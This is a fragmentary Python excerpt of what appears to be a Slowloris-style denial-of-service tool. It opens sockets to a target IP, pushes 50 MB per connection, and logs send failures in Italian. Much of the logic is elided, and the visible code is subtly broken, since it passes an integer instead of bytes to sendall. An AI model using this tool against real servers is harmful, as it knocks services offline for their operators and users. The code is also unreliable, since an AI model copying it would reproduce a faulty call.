...
use_https = False
sleeptime = 2
data_to_send_in_mb = 50#
data_in_bytes_DONT_TOUCH = int(data_to_send_in_mb * 1024 * 1024)
...
def init_socket(ip: str):
    ...
    try:
        s.sendall(data_in_bytes_DONT_TOUCH)
    except:
        logging.info(f"Errore nell'invio di {str(data_to_send_in_mb)} Megabites")
    return s
...
def slowloris_iteration():
    ...
    diff = socket_num - len(list_of_sockets)
    if diff <= 0:
        return
